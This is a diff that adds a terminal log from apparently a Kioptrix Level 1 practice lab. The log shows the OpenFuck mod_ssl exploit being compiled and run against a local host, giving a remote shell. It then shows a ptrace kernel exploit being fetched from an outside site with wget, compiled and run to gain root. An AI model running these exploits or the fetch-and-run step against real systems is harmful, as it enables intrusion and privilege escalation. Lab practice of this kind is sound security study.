@@ -1,0 +1,44 @@
+➜  apache_modSSL_443 gcc -o openfuck 764.c -lcrypto ; ./openfuck 0x6b 192.168.122.238 443 -c 40
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8068
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$
+ ./ets/ptrace-kmod.c; rm e; gcc -o /tmp/e ptrace-kmod.c; rm ptrace-kmod.c;
+--18:09:12--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:80... connected!
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--18:09:13--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   1.87 MB/s
+
+18:09:13 (1.25 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+[+] Attached to 1130
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+whoami
+root
+hostname
+kioptrix.level1
